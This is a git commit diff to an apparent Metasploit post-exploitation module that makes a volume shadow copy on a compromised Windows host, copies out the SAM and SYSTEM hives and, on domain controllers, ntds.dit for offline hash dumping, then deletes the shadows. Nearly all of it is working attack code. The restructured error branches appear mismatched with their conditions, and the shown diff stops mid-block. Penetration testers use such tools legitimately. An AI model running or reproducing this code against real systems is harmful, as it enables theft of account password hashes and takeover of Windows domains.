b31a7a6b4b9fbcc622fdcf1f56d9a4b8e67f2812
Carlos Perez <carlos_perez@darkoperator.com>
2011-11-10 22:56:34 -0400

    Remove some unnecesary lines and made some priv checks in addiont windows version while I work on the client version of windows.

--- post/windows/gather/get_sam_files.rb
+++ post/windows/gather/get_sam_files.rb
@@ -1,6 +1,3 @@
-##
-# $Id$
-##
 require 'msf/core'
 require 'rex'
 
@@ -9,6 +6,7 @@ require 'msf/core/post/common'
 require 'msf/core/post/file'
 require 'msf/core/post/windows/priv'
 require 'msf/core/post/windows/registry'
+#require 'msf/core/post/windows/accounts'
 
 class Metasploit3 < Msf::Post
 
@@ -16,7 +14,8 @@ class Metasploit3 < Msf::Post
 	include Msf::Post::File
 	include Msf::Post::Windows::Priv
 	include Msf::Post::Windows::Registry
-	
+	#include Msf::Post::Windows::Accounts
+
 	def initialize(info={})
 		super( update_info( info,
 				'Name'          => 'Post Windows Gather SAM Files Module',
@@ -25,7 +24,7 @@ class Metasploit3 < Msf::Post
 					SAM and in the case of Domain Controllers the NTDS files for offline hash dumping.
 				},
 				'License'       => BSD_LICENSE,
-				'Author'        => [ 'NAME <NAME[at]DOMAIN>'],
+				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
 				'Version'       => '$Revision$',
 				'Platform'      => [ 'windows' ], 
 				'SessionTypes'  => [ 'meterpreter' ]
@@ -36,58 +35,66 @@ class Metasploit3 < Msf::Post
 	def run
 		# syinfo is only on meterpreter sessions
 		print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?
-		sysdrv = client.fs.file.expand_path("%SystemDrive%")
-		tmp_dir = client.fs.file.expand_path("%TEMP%")
-		loot_path = Msf::Config.loot_directory
-		cmd = "vssadmin create shadow /for=#{sysdrv.strip}"
-		print_status("Creating volume shadow copy for drive #{sysdrv}")
-		cmd_results = session.shell_command_token(cmd,15)
-		if cmd_results =~ /Successfully/
-			print_good("Creation of volusme shadow successful")
-			vs_path = cmd_results.scan(/Shadow Copy Volume Name: (\S*)/)[0].join
+		if is_admin?
+			if sysinfo['OS'] !~ /Windows 7|Vista|XP/
+				sysdrv = client.fs.file.expand_path("%SystemDrive%")
+				loot_path = Msf::Config.loot_directory
+				cmd = "vssadmin create shadow /for=#{sysdrv.strip}"
+				print_status("Creating volume shadow copy for drive #{sysdrv}")
+				puts cmd
+				cmd_results = cmd_exec(cmd,nil,15)
+				if cmd_results =~ /Successfully/
+					print_good("Creation of volume shadow successful")
+					vs_path = cmd_results.scan(/Shadow Copy Volume Name: (\S*)/)[0].join
 
-			# System Hive
-			print_status("Downloading SYSTEM hive")
-			sys_file = ::File.join(loot_path,"system_#{::Time.now.strftime("%Y%m%d.%M%S")}")
-			session.fs.file.download_file(sys_file, "#{vs_path}\\WINDOWS\\system32\\config\\system")
-			print_good("System file downloaded as #{sys_file}")
-			store_loot("windows.system", 
-				"registry/hive", 
-				session, ::File.read(sys_file, ::File.size(sys_file)), 
-				"system", 
-				"Windows SYSTEM Hive")
+					# System Hive
+					print_status("Downloading SYSTEM hive")
+					sys_file = ::File.join(loot_path,"system_#{::Time.now.strftime("%Y%m%d.%M%S")}")
+					session.fs.file.download_file(sys_file, "#{vs_path}\\WINDOWS\\system32\\config\\system")
+					print_good("System file downloaded as #{sys_file}")
+					store_loot("windows.system",
+						"registry/hive",
+						session, ::File.read(sys_file, ::File.size(sys_file)),
+						"system",
+						"Windows SYSTEM Hive")
 
-			# Sam hive
-			print_status("Downloading SAM hive")
-			sam_file = ::File.join(loot_path,"sam_#{::Time.now.strftime("%Y%m%d.%M%S")}")
-			session.fs.file.download_file(sam_file, "#{vs_path}\\WINDOWS\\system32\\config\\SAM")
-			print_good("SAM file downloaded as #{sam_file}")
-			store_loot("windows.sam", 
-				"registry/hive", 
-				session, 
-				::File.read(sam_file, ::File.size(sam_file)), 
-				"sam", 
-				"Windows SAM Hive")
+					# Sam hive
+					print_status("Downloading SAM hive")
+					sam_file = ::File.join(loot_path,"sam_#{::Time.now.strftime("%Y%m%d.%M%S")}")
+					session.fs.file.download_file(sam_file, "#{vs_path}\\WINDOWS\\system32\\config\\SAM")
+					print_good("SAM file downloaded as #{sam_file}")
+					store_loot("windows.sam",
+						"registry/hive",
+						session,
+						::File.read(sam_file, ::File.size(sam_file)),
+						"sam",
+						"Windows SAM Hive")
 
-			# NTDS database
-			if is_dc?
-				print_status("This is a Domain Controller")
-				print_status("Downloading NTDS file")
-				ntds_file = ::File.join(loot_path,"ntds_#{::Time.now.strftime("%Y%m%d.%M%S")}")
-				session.fs.file.download_file(ntds_file, "#{vs_path}\\WINDOWS\\NTDS\\ntds.dit")
-				print_good("NTDS file downloaded as #{ntds_file}")
-				store_loot("windows.ntds",
-					"registry/hive",
-					session,
-					::File.read(ntds_file, ::File.size(ntds_file)),
-					"ntds.dit",
-					"Windows DC NTDS DB")
+					# NTDS database
+					if is_dc?
+						print_status("This is a Domain Controller")
+						print_status("Downloading NTDS file")
+						ntds_file = ::File.join(loot_path,"ntds_#{::Time.now.strftime("%Y%m%d.%M%S")}")
+						session.fs.file.download_file(ntds_file, "#{vs_path}\\WINDOWS\\NTDS\\ntds.dit")
+						print_good("NTDS file downloaded as #{ntds_file}")
+						store_loot("windows.ntds",
+							"registry/hive",
+							session,
+							::File.read(ntds_file, ::File.size(ntds_file)),
+							"ntds.dit",
+							"Windows DC NTDS DB")
+					end
+
+					# Cleanup
+					print_status("Removing Shadow Copies")
+					cmd_results = session.shell_command_token("vssadmin delete shadows",15)
+					print_status("Saving in to loot")
+				else
+					print_error("This version of Windows is not supported at the momment.")
+				end
+			else
+				print_error("You need to be Administrator to be able to create a volume shadow copy.")
 			end
-
-			# Cleanup
-			print_status("Removing Shadow Copies")
-			cmd_results = session.shell_command_token("vssadmin delete shadows",15)
-			print_status("Saving in to loot")
 		else
 			print_error("Volume Shadow copy for #{sysdrv} could not be made")
 			cmd_results.each_line do |l|
